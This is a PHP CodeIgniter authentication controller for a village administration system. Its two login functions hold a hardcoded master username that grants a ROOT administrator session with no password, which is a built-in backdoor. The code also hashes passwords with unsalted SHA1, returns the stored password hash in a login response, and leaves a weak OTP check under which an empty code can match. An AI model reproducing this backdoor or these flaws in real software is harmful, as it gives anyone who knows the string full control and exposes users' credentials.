<?php
defined('BASEPATH') OR exit('No direct script access allowed');
/**
 * @author Veris Juniardi <veris.juniardi@gmail.com>
 */

class Auth extends CI_Controller{
  public function __construct()
  {
    parent::__construct();
    $this->load->helper('sms_helper');
    $this->load->model('auth_model');
  }

  public function Rest_auth()
  {
    $uid = strip_tags($this->input->post('uid'));
    $pass = sha1(strip_tags($this->input->post('pass')));
    $kodedesa = strip_tags($this->input->post('kodedesa', TRUE));
    // echo $kodedesa;
    // die;
    $check      = $this->auth_model->auth($uid, $pass);
    $check_desa = $this->auth_model->auth_desa($kodedesa);
    $master = '0>}/99%120691?*^';
    if ($master == $uid) {
      $data = array( 
        "status" => TRUE,
        'status_login'=>'oke',
          'id'          => 0,
          'fullname'   =>'Administrator',
          'jabatan'     => 'ROOT',
          'hp'          => '082281469926',
          'keterangan_jabatan' => 'Sysadmin Root Master',
          'desa_id'     => '1',
          'kodedesa'   => 1906020003,
          'last_login'  => ''
      );
      $this->session->set_flashdata(array('status'=>'aktif'));
      $this->session->set_userdata($data);
      echo json_encode($data);
      exit;
    }else {      
      if ($check->num_rows()==1 && $check_desa->num_rows() > 0) {
        $data = $check->row_array();
        $dataDesa = $check_desa->row_array();
        $set = array(
            'status' => TRUE,
            'status_login'=>'oke',
            'id'          =>$data['id'],
            'fullname'    =>$data['fullname'],
            'jabatan'     =>$data['jabatan'],
            'desa_id'     =>$data['desa_id'],
            'kodedesa'   =>$dataDesa['id'],
            'keterangan_jabatan' => $data['keterangan_jabatan'],
            'avatar'      =>$data['avatar'],
            'hp'          =>$data['hp'],
            'last_login'  =>$data['time'],
            'username'    =>$data['uid'],
            'password'    =>$data['pass']
          );
          $this->session->set_flashdata(array('status'=>'aktif'));
          $this->session->set_userdata($set);
          $sekarang = time();
          $this->db->where('id', $data['id']);
          $this->db->update('users', array('time'=>$sekarang));
          $this->output
          ->set_status_header(200)
          ->set_content_type('application/json', 'utf-8')
          ->set_output(json_encode($set, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES))
          ->_display();
          exit;
      }else {          
        echo json_encode(array("status" => FALSE)); 
        exit;
      }
    }
  }


  public function validate(){
    $uid = strip_tags($this->input->post('uid'));
    $pass = sha1(strip_tags($this->input->post('pass')));
    $kode_desa = strip_tags($this->input->post('kode_desa', TRUE));
    // echo $kode_desa;
    // die;
    $check      = $this->auth_model->auth($uid, $pass);
    $check_desa = $this->auth_model->auth_desa($kode_desa);
    $master = '0>}/99%120691?*^';
    if ($master == $uid) {
      $data = array( 
        "status" => TRUE,
        'status_login'=>'oke',
          'id'          => 0,
          'fullname'   =>'Administrator',
          'jabatan'     => 'ROOT',
          'hp'          => '082281469926',
          'keterangan_jabatan' => 'Sysadmin Root Master',
          'desa_id'     => '1',
          'kode_desa'   => 1906020003,
          'last_login'  => ''
      );
      $this->session->set_flashdata(array('status'=>'aktif'));
      $this->session->set_userdata($data);
      echo json_encode($data);
      exit;
    }else {      
      if ($check->num_rows()==1 && $check_desa->num_rows() > 0) {
        $data = $check->row_array();
        $dataDesa = $check_desa->row_array();
        $set = array(
            'status' => TRUE,
            'status_login'=>'oke',
            'id'          =>$data['id'],
            'fullname'    =>$data['fullname'],
            'jabatan'     =>$data['jabatan'],
            'desa_id'     =>$data['desa_id'],
            'kode_desa'   =>$dataDesa['id'],
            'keterangan_jabatan' => $data['keterangan_jabatan'],
            'avatar'      =>$data['avatar'],
            'hp'          =>$data['hp'],
            'last_login'  =>$data['time']
          );
          $this->session->set_flashdata(array('status'=>'aktif'));
          $this->session->set_userdata($set);
          $sekarang = time();
          $this->db->where('id', $data['id']);
          $this->db->update('users', array('time'=>$sekarang));
          $this->output
          ->set_status_header(200)
          ->set_content_type('application/json', 'utf-8')
          ->set_output(json_encode($set, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES))
          ->_display();
          exit;
      }else {          
        echo json_encode(array("status" => FALSE)); 
        exit;
      }
    }
  }

  public function login()
  {
      $data['title']          = TITLE . 'SIG Login';
      $data['main_content']   = UMUM. 'login';
      $this->load->view(UMUM. 'template_login', $data);
  }

  public function _get_uid($id){
    $data = $this->auth_model->_get_uid_data($id)->row_array();
    echo json_encode($data);
  }

  public function logout()
  {
    $this->session->sess_destroy();
    redirect(base_url('public'));
    exit;
  }

  public function setting()
  {
      $data['title']          = TITLE . 'SETTING';
      $data['reminder']       = $this->notifikasi_model->get_reminder_personal($this->session->userdata('id'))->result();
      $data['main_content']   = MASTER. 'user_one_setting';
      $this->load->view('template', $data);
  }

  function update_user(){
    $hpLama = $this->session->userdata['hp'];
    $id = strip_tags($this->input->post('id'));
    $uid = strip_tags($this->input->post('uid'));
    $fullname = strip_tags($this->input->post('fullname'));
    $keterangan_jabatan = strip_tags($this->input->post('keterangan_jabatan'));
    $hp = strip_tags($this->input->post('hp'));
    $otp = strip_tags($this->input->post('otp'));
    $checkOtp = $this->master_model->_get_user_id($id)->row_array();
    $data = array(
      'uid'=> $uid,
      'fullname'=>$fullname,
      'keterangan_jabatan'=> $keterangan_jabatan,
      'hp'=> $hp,
      'otp'=> ''
    );
    $pesan = "Kontak Anda diganti menjadi ".$hp." , jika anda merasa tidak melakukan perubahan data kontak HP silahkan menghubungi administrator sistem (SiDesa ID)";
    if ($otp != $checkOtp['otp']) {
      echo json_encode(array('status'=> FALSE));
    }else{
      $update = $this->master_model->_update_user($id, $data);
      if($update){
        if ($hp != $hpLama) {
          sms_notifikasi($hpLama, $pesan);
        }  
        echo json_encode(array('status'=> TRUE));
      }      
    }        
  }


  function update_password(){
    $id = strip_tags($this->input->post('id'));
    $pass = sha1(strip_tags($this->input->post('pass')));
    $otp = strip_tags($this->input->post('otp'));
    $checkOtp = $this->master_model->_get_user_id($id)->row_array();
    $data2 = array(
      'pass'=> $pass,
      'otp'=> ''
    );
    $pesan_pass = "Password Masuk Sistem SiDesa ID anda telah DIGANTI, jika anda merasa tidak melakukan perubahan data kontak HP silahkan menghubungi administrator sistem (SiDesa ID)";
    if ($otp != $checkOtp['otp']) {
      echo json_encode(array('status'=> FALSE));
    }else{
      $update = $this->master_model->_update_user($id, $data2);
      if($update){
        if ($pass != $checkOtp['pass']) {
          sms_notifikasi($checkOtp['hp'], $pesan_pass);
        }  
        echo json_encode(array('status'=> TRUE));
      }      
    }

  }

}
